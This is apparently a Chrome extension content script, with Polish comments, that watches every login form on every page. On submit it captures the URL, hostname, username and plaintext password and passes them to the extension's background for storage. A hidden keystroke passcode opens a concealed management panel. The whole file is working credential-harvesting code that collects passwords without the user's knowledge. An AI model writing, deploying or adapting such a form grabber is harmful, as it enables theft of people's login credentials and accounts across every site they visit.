(function() {
  // Funkcja do przypisywania listenera do formularza
  function attachListener(form) {
    if (form._listenerAdded) return; // zapobiegaj podwójnemu przypisaniu
    form._listenerAdded = true;

    form.addEventListener('submit', function(event) {
      try {
        var userInput = null;
        var passInput = null;
        var inputs = form.getElementsByTagName('input');

        for (var i = 0; i < inputs.length; i++) {
          var input = inputs[i];
          if (!userInput && (input.type === 'text' || input.type === 'email' || input.autocomplete === 'username')) {
            userInput = input;
          }
          if (!passInput && (input.type === 'password' || input.autocomplete === 'current-password')) {
            passInput = input;
          }
        }

        if (userInput && passInput && userInput.value && passInput.value) {
          chrome.runtime.sendMessage({
            action: 'queryDatabase',
            crud: 'create',
            record: [
              window.location.href,
              window.location.hostname,
              userInput.value,
              passInput.value
            ]
          });
        }
      } catch (e) {
        console.error('Błąd w monitorowaniu formularza:', e);
      }
    });
  }

  // Monitoruj już istniejące formularze
  function monitorExistingForms() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
      attachListener(forms[i]);
    }
  }

  // Obserwuj DOM pod kątem nowych formularzy (dynamiczne strony SPA itp.)
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.addedNodes.length) {
        mutation.addedNodes.forEach(function(node) {
          if (node.tagName === 'FORM') {
            attachListener(node);
          } else if (node.querySelectorAll) {
            var forms = node.querySelectorAll('form');
            for (var i = 0; i < forms.length; i++) {
              attachListener(forms[i]);
            }
          }
        });
      }
    });
  });

  // Start obserwacji na body
  if (document.body) {
    observer.observe(document.body, { childList: true, subtree: true });
    monitorExistingForms();
  } else {
    window.addEventListener('DOMContentLoaded', function () {
      observer.observe(document.body, { childList: true, subtree: true });
      monitorExistingForms();
    });
  }

  // Monitorowanie naciśnięcia passcode
  var passcode;
  var progress = 0;

  chrome.storage.local.get('passcode', function(response) {
    passcode = (response.passcode || '').toUpperCase();
  });

  chrome.storage.onChanged.addListener(function(changes) {
    if (changes.passcode) {
      passcode = changes.passcode.newValue.toUpperCase();
    }
  });

  window.addEventListener('keydown', function(event) {
    if (!passcode || passcode.length === 0) {
      progress = 0;
      return;
    }

    if (event.key.toUpperCase() === passcode.charAt(progress)) {
      progress++;
      if (progress === passcode.length) {
        chrome.runtime.sendMessage({ action: 'openManage' });
        progress = 0;
      }
    } else {
      progress = 0;
    }
  });
})();
